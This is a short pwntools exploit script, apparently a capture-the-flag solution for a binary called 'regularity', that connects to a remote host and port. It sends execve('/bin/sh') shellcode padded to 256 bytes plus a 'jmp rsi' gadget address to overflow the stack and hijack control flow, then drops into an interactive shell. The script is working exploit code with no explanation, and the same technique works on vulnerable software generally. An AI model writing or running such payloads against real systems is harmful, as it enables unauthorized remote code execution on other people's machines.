#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./regularity')

#p = process()
p = remote('83.136.254.60',52874)
#gdb.attach(p,gdbscript='''
#           b*0x40106e
#           ''')
jmp_rsi = 0x0000000000401041

shellcode = asm('''
                xor rdx,rdx
                mov rbx,29400045130965551
                push rbx

                mov rdi,rsp
                xor rsi,rsi
                mov rax,0x3b
                syscall
                ''')

payload = shellcode
payload = payload.ljust(256,b'\x00')
payload += p64(jmp_rsi)
input()
p.send(payload)

p.interactive()
